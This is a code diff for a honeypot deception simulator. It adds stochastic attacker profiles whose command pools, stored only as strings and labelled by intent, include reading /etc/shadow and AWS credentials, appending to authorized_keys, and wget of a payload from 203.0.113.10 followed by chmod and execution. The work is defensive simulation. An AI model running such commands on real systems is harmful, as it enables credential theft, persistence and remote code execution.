@@ -74,6 +74,82 @@ SCENARIOS = {
 }
 
 
+# SIMULATED attacker profiles (docs/DECEPTION_ARENA.md §Profiles). Each is a stochastic phase model, not a script:
+# phases are visited in order, each with its own command pool, number of commands, think-time range and chance of
+# moving on. Persona sensitivity and persona recognition (fingerprinting) are ASSUMED parameters per profile.
+_P = lambda **kw: {"kind": "SIMULATED", "model": "profile", **kw}  # noqa: E731
+PROFILE_SCENARIOS = {
+    "profile_recon_scanner": _P(
+        title="Reconnaissance scanner (automated, fast, shallow)", loginSuccess=0.9,
+        phases=[("recon", [("uname -a", "RECONNAISSANCE"), ("cat /proc/cpuinfo", "RECONNAISSANCE"), ("nproc", "RECONNAISSANCE"),
+                           ("free -m", "RECONNAISSANCE"), ("ls /", "RECONNAISSANCE")], (2, 5), (1, 3), 0.35)],
+        stayProbability={"ubuntu_22": 0.55, "debian_11": 0.5, "centos_7": 0.5, "aws_ec2": 0.6, "raspberry_pi": 0.45},
+        fingerprintProbability={"default": 0.05}),
+    "profile_credential_bruteforcer": _P(
+        title="Credential brute-forcer (many logins, little shell activity)", loginSuccess=0.35,
+        phases=[("auth", [("passwd", "CREDENTIAL_HARVEST"), ("cat /etc/shadow", "CREDENTIAL_HARVEST")], (1, 2), (1, 4), 0.25),
+                ("recon", [("id", "RECONNAISSANCE"), ("w", "RECONNAISSANCE")], (1, 2), (2, 6), 0.5)],
+        stayProbability={"ubuntu_22": 0.5, "debian_11": 0.5, "centos_7": 0.55, "aws_ec2": 0.5, "raspberry_pi": 0.6},
+        fingerprintProbability={"default": 0.02}),
+    "profile_interactive_explorer": _P(
+        title="Interactive explorer (human-paced, deep discovery)", loginSuccess=1.0,
+        phases=[("recon", [("uname -a", "RECONNAISSANCE"), ("id", "RECONNAISSANCE"), ("ps aux", "RECONNAISSANCE"),
+                           ("netstat -tulnp", "RECONNAISSANCE"), ("ls -la /root", "RECONNAISSANCE"), ("cat /etc/os-release", "RECONNAISSANCE")], (2, 6), (8, 40), 0.8),
+                ("discovery", [("find / -name '*.conf'", "RECONNAISSANCE"), ("cat ~/.bash_history", "CREDENTIAL_HARVEST"),
+                               ("cat ~/.aws/credentials", "CREDENTIAL_HARVEST"), ("sudo -l", "PRIVILEGE_ESCALATION")], (1, 5), (10, 60), 0.6)],
+        stayProbability={"ubuntu_22": 0.86, "debian_11": 0.84, "centos_7": 0.72, "aws_ec2": 0.88, "raspberry_pi": 0.7},
+        fingerprintProbability={"default": 0.05, "raspberry_pi": 0.12}),
+    "profile_persistence_seeker": _P(
+        title="Persistence seeker (cron, keys, services)", loginSuccess=0.95,
+        phases=[("recon", [("uname -a", "RECONNAISSANCE"), ("id", "RECONNAISSANCE")], (1, 3), (3, 12), 0.9),
+                ("persist", [("crontab -l", "PERSISTENCE"), ("cat ~/.ssh/authorized_keys", "PERSISTENCE"),
+                             ("echo key >> ~/.ssh/authorized_keys", "PERSISTENCE"), ("systemctl list-units", "RECONNAISSANCE")], (2, 5), (5, 25), 0.7)],
+        stayProbability={"ubuntu_22": 0.82, "debian_11": 0.85, "centos_7": 0.8, "aws_ec2": 0.78, "raspberry_pi": 0.7},
+        fingerprintProbability={"default": 0.04}),
+    "profile_cautious_fingerprinter": _P(
+        title="Cautious fingerprinter (checks for virtualisation, leaves early)", loginSuccess=1.0,
+        phases=[("recon", [("uname -a", "RECONNAISSANCE"), ("cat /proc/1/cgroup", "RECONNAISSANCE"), ("ls /.dockerenv", "RECONNAISSANCE")], (1, 3), (5, 20), 0.6)],
+        stayProbability={"ubuntu_22": 0.6, "debian_11": 0.65, "centos_7": 0.55, "aws_ec2": 0.7, "raspberry_pi": 0.5},
+        fingerprintProbability={"default": 0.3, "aws_ec2": 0.18, "raspberry_pi": 0.45}),
+    "profile_opportunistic_dropper": _P(
+        title="Opportunistic dropper (download and run a payload)", loginSuccess=0.9,
+        phases=[("recon", [("uname -a", "RECONNAISSANCE")], (1, 2), (2, 8), 0.95),
+                ("drop", [("wget http://203.0.113.10/x.sh", "MALWARE_DOWNLOAD"), ("curl -O http://203.0.113.10/m", "MALWARE_DOWNLOAD"),
+                          ("chmod +x x.sh", "MALWARE_DOWNLOAD"), ("./x.sh", "MALWARE_DOWNLOAD")], (2, 4), (3, 15), 0.6),
+                ("persist", [("crontab -l", "PERSISTENCE")], (0, 1), (3, 10), 0.5)],
+        stayProbability={"ubuntu_22": 0.8, "debian_11": 0.78, "centos_7": 0.84, "aws_ec2": 0.76, "raspberry_pi": 0.86},
+        fingerprintProbability={"default": 0.03}),
+}
+SCENARIOS.update(PROFILE_SCENARIOS)
+
+
+def _play_profile(scenario: dict, persona: str, rng: random.Random, max_seconds: int):
+    """One session of a PROFILE attacker. Returns (commands, duration, termination, login)."""
+    commands, duration, termination = [], 0, "completed"
+    login = rng.random() < scenario["loginSuccess"]
+    if not login:
+        return commands, rng.randint(2, 10), "login_failed", False
+    stay = scenario["stayProbability"].get(persona, 0.5)
+    fp = scenario["fingerprintProbability"]
+    p_fp = fp.get(persona, fp["default"])
+    for _phase, pool, (lo_n, hi_n), (lo_t, hi_t), p_next in scenario["phases"]:
+        for _ in range(rng.randint(lo_n, hi_n)):
+            wait = rng.randint(lo_t, hi_t)
+            if duration + wait > max_seconds:
+                return commands, duration, "time_limit", login
+            duration += wait
+            if rng.random() < p_fp:
+                commands.append({"command": "systemd-detect-virt", "intent": "RECONNAISSANCE"})
+                return commands, duration, "fingerprinted", login
+            cmd, intent = pool[rng.randrange(len(pool))]
+            commands.append({"command": cmd, "intent": intent})
+            if rng.random() > stay:
+                return commands, duration, "attacker_left", login
+        if rng.random() > p_next:
+            return commands, duration, "attacker_left", login
+    return commands, duration, termination, login
+
+
 def sha256(path: Path):
     return hashlib.sha256(path.read_bytes()).hexdigest() if path.exists() else None
 
@@ -85,6 +161,11 @@ def now():
 def play_session(scenario: dict, persona: str, rng: random.Random, max_seconds: int) -> dict:
     """One attacker session against `persona`. Scripted scenarios ignore the persona by construction."""
     commands, duration, termination = [], 0, "completed"
+    if scenario.get("model") == "profile":
+        commands, duration, termination, login = _play_profile(scenario, persona, rng, max_seconds)
+        session = {"durationSeconds": duration, "commands": commands, "loginSucceeded": login, "iocCount": 0}
+        return {**session, "termination": termination, "fingerprinted": termination == "fingerprinted",
+                "reward": round(calc_reward(session), 4)}
     if scenario["kind"] == "SCRIPTED":
         for cmd, intent, wait in scenario["steps"]:
             if duration + wait > max_seconds:
@@ -123,6 +204,8 @@ def validate(cfg: dict) -> dict:
         raise ValueError("scenario not in allowlist")
     if cfg.get("baselinePersona") not in PROFILES_LIST:
         raise ValueError("unknown persona")
+    if cfg["baselinePersona"] not in servable_profiles():
+        raise ValueError("baseline persona is not servable (unsupported personas cannot be a baseline)")
     n = int(cfg.get("trialsPerStrategy", 0))
     if not 1 <= n <= MAX_TRIALS:
         raise ValueError(f"trialsPerStrategy must be 1..{MAX_TRIALS}")
